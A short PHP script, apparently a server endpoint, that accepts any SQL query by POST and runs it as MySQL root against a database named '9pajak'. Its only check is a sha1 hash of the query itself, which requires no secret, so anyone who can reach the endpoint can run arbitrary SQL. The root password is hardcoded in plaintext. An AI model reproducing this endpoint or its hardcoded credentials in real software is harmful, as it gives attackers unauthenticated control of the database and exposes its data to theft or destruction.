<?php

error_reporting(E_ALL);
error_reporting(-1);
ini_set('error_reporting', E_ALL);


error_reporting(E_ERROR & ~E_NOTICE & ~E_DEPRECATED);
ini_set("display_errors", 1); 

if($_SERVER["REQUEST_METHOD"] == "POST") {
    $qry = @isset($_POST['qry']) ? $_POST['qry'] : false;
    $sha1 = @isset($_POST['sha1']) ? $_POST['sha1'] : false;
    if(!$qry || !$sha1) die('parameter false');
}else{
   die('Method is post');
}

$sha1_validate = sha1($qry);

if($sha1!==$sha1_validate) die('sha1 validate false');

$host2 = 'localhost';
$user2 = 'root';
$pass2 = 'Lamsel2@21';
$db2   = '9pajak';
$conn = mysqli_connect($host2, $user2, $pass2, $db2);

$rs = mysqli_query($conn, $qry);

die();